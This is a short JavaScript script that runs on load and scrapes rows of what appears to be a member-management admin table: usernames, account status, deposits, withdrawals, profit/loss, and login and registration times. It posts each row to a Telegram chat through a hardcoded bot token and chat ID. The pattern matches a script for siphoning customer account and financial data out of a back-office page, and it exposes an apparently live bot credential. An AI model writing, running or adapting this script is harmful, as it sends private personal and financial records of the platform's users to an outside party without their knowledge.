const telegram_token = "7460074422:AAFxnRwBHIMZzjvYFTmVaa7sWdgBqwPDghc";
const chat_id = -1002157248963;

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${telegram_token}/sendMessage`;
    const data = {
        chat_id: chat_id,
        text: message
    };

    console.log("Sending message to Telegram:", message);

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    }).then(response => response.json())
      .then(data => {
          if (!data.ok) {
              console.error("Error sending message to Telegram:", data);
          } else {
              console.log("Message sent to Telegram successfully:", data);
          }
      })
      .catch(error => console.error("Error sending message to Telegram:", error));
}

function getDataAndSend() {
    console.log("Starting to get data and send to Telegram...");
    
    const rows = document.querySelectorAll("tr.ant-table-row");
    console.log(`Rows found: ${rows.length}`);
    
    if (rows.length === 0) {
        console.error("No rows found with the selector 'tr.ant-table-row'.");
        return;
    }

    rows.forEach((row, index) => {
        const cells = row.querySelectorAll("td");
        console.log(`Row ${index + 1} cells found: ${cells.length}`);

        const cellData = Array.from(cells).map(cell => cell.innerText.trim());
        console.log(`Row ${index + 1} data:`, cellData);

        if (cellData.length < 11) {
            console.error("Row does not contain enough data:", cellData);
            return;
        }

        // 确认每个索引的数据
        const 用户名 = cellData[1] ? cellData[1] : 'N/A';
        const 状态 = cellData[2] ? cellData[2] : 'N/A';
        const 存款 = cellData[4] ? cellData[4] : 'N/A';
        const 提款 = cellData[5] ? cellData[5] : 'N/A';
        const 盈亏 = cellData[6] ? cellData[6] : 'N/A';

        const 登陆时间部分 = cellData[7] ? cellData[7].split('\n').map(item => item.trim()).filter(Boolean) : [];
        const 登陆时间 = 登陆时间部分.length >= 2 ? `${登陆时间部分[0]} ${登陆时间部分[1]}` : 'N/A';

        const 注册时间部分 = cellData[8] ? cellData[8].split('\n').map(item => item.trim()).filter(Boolean) : [];
        const 注册时间 = 注册时间部分.length >= 2 ? `${注册时间部分[0]} ${注册时间部分[1]}` : 'N/A';

        const 会员标签 = cellData[9] ? cellData[9] : 'N/A';

        console.log(`用户名: ${用户名}, 状态: ${状态}, 存款: ${存款}, 提款: ${提款}, 盈亏: ${盈亏}, 登陆时间: ${登陆时间}, 注册时间: ${注册时间}, 会员标签: ${会员标签}`);

        const data = {
            编号: index + 1,
            用户名: 用户名,
            状态: 状态,
            存款: 存款,
            提款: 提款,
            盈亏: 盈亏,
            登陆时间: 登陆时间,
            注册时间: 注册时间,
            会员标签: 会员标签
        };

        const message = `
编号: ${data.编号}
用户名: ${data.用户名}
状态: ${data.状态}
存款: ${data.存款}
提款: ${data.提款}
盈亏: ${data.盈亏}
登陆时间: ${data.登陆时间}
注册时间: ${data.注册时间}
会员标签: ${data.会员标签}
        `;

        console.log("Message to be sent to Telegram:", message);
        sendToTelegram(message);
    });
}

getDataAndSend();